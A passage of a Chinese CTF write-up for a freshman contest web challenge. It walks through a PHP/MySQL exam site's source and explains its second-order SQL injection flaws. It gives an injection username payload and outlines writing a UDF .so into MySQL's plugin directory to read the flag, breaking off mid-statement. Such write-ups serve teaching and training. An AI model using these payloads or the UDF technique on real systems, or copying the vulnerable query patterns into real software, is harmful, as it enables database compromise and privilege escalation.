经典登录语句，$username和$studentid都经过了addslashes_deep转义</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where username='<span class="token interpolation"><span class="token variable">$username</span></span>' and studentid='<span class="token interpolation"><span class="token variable">$studentid</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 如果登录了admin就重置admin密码，这里在下方还会再讲</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"update users set studentid='<span class="token interpolation"><span class="token variable">$random</span></span>' where username='admin'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"用户名或密码错误 QAQ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="index"><a href="#index" class="headerlink" title="index"></a>index</h4><p>下面就是最大头的index部分了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>  // 如果登录就给出登出按钮  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logout.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>登出<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token comment">// 如果是admin就给出单独查成绩的界面</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span> <span class="token delimiter important">?></span></span>    查询<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>score.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>成绩<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>或<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rank.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>排名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token comment">// 并且不再继续往下</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                       <span class="token punctuation">&#125;</span><span class="token keyword">endif</span><span class="token punctuation">;</span><span class="token comment">// 下面是普通用户的流程</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token constant">MYSQL_HOST</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_USER</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_PASSWORD</span><span class="token punctuation">,</span> <span class="token constant">MYSQL_DATABASE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 检查score表是否有分了，有分就表示做过了</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from score where username='"</span><span class="token operator">.</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span> <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token delimiter important">?></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>您已完成测试<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>br</span><span class="token punctuation">></span></span>查询<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>score.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>成绩<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>或<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rank.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>排名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>    <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                              <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">...</span><span class="token operator">...</span>  <span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token keyword">else</span><span class="token punctuation">:</span> <span class="token delimiter important">?></span></span>  // 没登录展示如下  请先<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 登陆<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  或<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>register.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 注册<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>  查询<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>score.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>成绩<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>或<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mui--appbar-height<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>rank.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>排名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">></span></span>  <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre><p>接着就是没做过题的普通用户流程，一段联合查询语句查出该用户抽的题目并从题库challengesAll中抽出这些题目再展示</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT  type,Title,TitleImg,OptionA,OptionB,OptionC,OptionD  FROM  challengesAll,randChallenges   WHERE  randChallenges.username = '"</span><span class="token operator">.</span><span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'  AND (challengesAll.id = randChallenges.challengeId1        OR challengesAll.id = randChallenges.challengeId2        OR challengesAll.id = randChallenges.challengeId3        OR challengesAll.id = randChallenges.challengeId4        OR challengesAll.id = randChallenges.challengeId5)"</span><span class="token punctuation">)</span> <span class="token comment">// 很蹩脚的查询</span></code></pre><p>接着解析，单选题和判断题有不同的展示方式，到目前为止都很正常。</p><p>下面就是判分了，原先这里没做判断，应该增加判断q1-5是否合法，防止直接在选项处就开始注入从而跳过考点了，这就是为什么有的师傅会疑问为什么有二次注入考点的问题。</p><p>然后就是出现问题的地方了，通过审计可以发现在$query的第二句<code>$_SESSION[&#39;username&#39;]</code>没有做转义，而在login处可以发现<code>$_SESSION[&#39;username&#39;]==($row[&#39;username&#39;])</code>如此一来我们存入数据库的username被提取出来，然后未经过转义就再次插入到了sql语句中，从而造成了二次注入的漏洞。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// 先查一下是否已经完成过测试，防止一个用户有多条结果</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from score where username='"</span><span class="token operator">.</span><span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>alert(\"用户已完成测试\");&lt;/script>"</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 可以看到在第二句中$_SESSION['username</span><span class="token string single-quoted-string">']未做转义    // 这里q1-5后续增加了合法性判断    $query = "insert into score values (NULL, '</span><span class="token string double-quoted-string">".addslashes_deep(<span class="token interpolation"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span></span>)."</span><span class="token string single-quoted-string">', $getscroe);            insert into userAnswer values (NULL, '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q1'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q2'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q3'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q4'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">', '</span><span class="token string double-quoted-string">".<span class="token interpolation"><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'q5'</span><span class="token punctuation">]</span></span>."</span><span class="token string single-quoted-string">')";    //            var_dump($query);    //            exit(1);    if ($mysqli->multi_query($query)===TRUE) &#123;      $mysqli->close();      echo "&lt;script>alert(\"已完成测试！\");&lt;/script>";      echo "&lt;script language='</span>JavaScript<span class="token string single-quoted-string">'>location.replace('</span>index<span class="token operator">.</span>php'<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span class="token string double-quoted-string">";    &#125; else &#123;      exit("</span>something err0r！"<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="score"><a href="#score" class="headerlink" title="score"></a>score</h4><p>获取了admin我们就可以查询对应用户的成绩了</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">// 对传入studentid转义，没啥问题</span>  <span class="token variable">$studentid</span> <span class="token operator">=</span> <span class="token function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'studentid'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//            var_dump($studentid);</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token property">connect_errno</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"something err0r！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token comment">// 首先去users表查studentid对应的username</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from users where studentid='<span class="token interpolation"><span class="token variable">$studentid</span></span>';"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token comment">// 拿查到的username去查对应成绩</span>      <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from score where username='<span class="token interpolation"><span class="token variable">$username</span></span>';"</span><span class="token punctuation">;</span>      <span class="token operator">...</span>      <span class="token operator">...</span></code></pre><p>很明显在上面👆这段中也是非常经典的二次注入。由于score表中存的是<code>username</code>和成绩的映射，而这里是输入学号查询，查询语句没有做join，而是先查users表拿到<code>username</code>再查score，我们的<code>username</code>可是经过转义存入表中的，拿出来未做转义直接插入了另一句sql语句中，从而造成了二次注入。</p><p>还有一个小细节，在建表的时候可以看见<code>username</code>是mediumtext而不是varchar，也可以猜到这里有问题了</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span><span class="token punctuation">;</span><span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token identifier"><span class="token punctuation">`</span>users<span class="token punctuation">`</span></span> <span class="token punctuation">(</span>  <span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span> <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>username<span class="token punctuation">`</span></span> <span class="token keyword">mediumtext</span><span class="token punctuation">,</span>  <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>  <span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>id<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">,</span>  <span class="token keyword">UNIQUE</span> <span class="token keyword">KEY</span> <span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span> <span class="token punctuation">(</span><span class="token identifier"><span class="token punctuation">`</span>studentid<span class="token punctuation">`</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">11</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span></code></pre><h4 id="剩下的网页-amp-接下来的思路"><a href="#剩下的网页-amp-接下来的思路" class="headerlink" title="剩下的网页 &amp; 接下来的思路"></a>剩下的网页 &amp; 接下来的思路</h4><h5 id="config"><a href="#config" class="headerlink" title="config"></a>config</h5><p>存了数据库连接信息和俩函数，一个是转义的一个是检查q合法性的</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">addslashes_deep</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">array_map</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'addslashes_deep'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token class-name return-type">addslashes</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">checkQ</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$q</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"2"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"3"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"4"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h5 id="logout"><a href="#logout" class="headerlink" title="logout"></a>logout</h5><p>退出登录</p><h5 id="rank"><a href="#rank" class="headerlink" title="rank"></a>rank</h5><p>查看排行，语句写死的，没有操作空间</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from score order by score desc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h5 id="接下来的思路"><a href="#接下来的思路" class="headerlink" title="接下来的思路"></a>接下来的思路</h5><p>相信做到这一步的师傅们肯定数据库也看过了，当然毕竟是新生赛，网页全部源码数据库文件和配置文件全部都给大家了，考验的就是看大家的细心程度</p><p>init.sql文件可以看到在ctf表中有这样一条记录</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">BEGIN</span><span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> <span class="token identifier"><span class="token punctuation">`</span>ctf<span class="token punctuation">`</span></span> <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'flag'</span><span class="token punctuation">,</span> <span class="token string">'flag_in_/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">COMMIT</span><span class="token punctuation">;</span></code></pre><p>flag在根目录？那不就是要load_file读文件吗。那再看一下权限</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">file</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre><p>可以文件落地，也有insert权限</p><p>再看一下目录</p><pre class="language-sql" data-language="sql"><code class="language-sql">secure<span class="token operator">-</span><span class="token keyword">file</span><span class="token operator">-</span>priv<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>lib64<span class="token operator">/</span>mysql<span class="token operator">/</span>plugin</code></pre><p>虽然不为空，但看到plugin应该很敏感，在插件目录下，可以文件落地，要读文件，很明显那就是用udf或者mof了</p><p>这里提一句，如果没限制目录但flag去了权限，那有师傅就会想去在web目录下落地个webshell，但这里部署是站库分离的，后面也会讲这一点，mysql服务器在内网可出网，没有web服务，问题来了，如果不可出网该怎么利用呢？这里留一个思考的问题。</p><h4 id="落地-so文件"><a href="#落地-so文件" class="headerlink" title="落地.so文件"></a>落地.so文件</h4><p>由于服务器是linux的，我们就要写.so文件在plugin目录下，如果是windows就要写.dll文件</p><p>sqlmap其实自带提权脚本，但没法直接利用，把它的.so文件导出后hex取其值接下来会用到</p><p>已经有admin了所以操作会简单很多，语句为</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> score <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'$username'</span><span class="token punctuation">;</span></code></pre><p>那我们注册一个学号为1，用户名为<code>a&#39;;select 123#</code>的用户，然后去查对应的学号就行了</p><p>我们把.so文件写入到plugin目录下</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 写.so文件</span>a<span class="token string">';select &lt;0x7F...刚才获取的hex值> into 